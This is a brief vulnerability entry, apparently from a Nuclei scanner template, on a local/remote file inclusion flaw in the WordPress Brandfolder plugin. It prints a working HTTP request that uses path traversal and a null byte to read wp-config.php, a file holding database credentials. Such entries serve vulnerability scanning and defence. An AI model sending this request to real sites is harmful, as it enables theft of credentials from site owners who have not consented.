# Vulnerability: Wordpress Brandfolder - Remote/Local File Inclusion
**Classification:** CWE-23
**Source:** Nuclei Template (`brandfolder-lfi.yaml`)

## Description
WordPress Brandfolder allows remote attackers to access arbitrary files that reside on the local and remote server and disclose their content.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/brandfolder/callback.php?wp_abspath=../../../wp-config.php%00
```

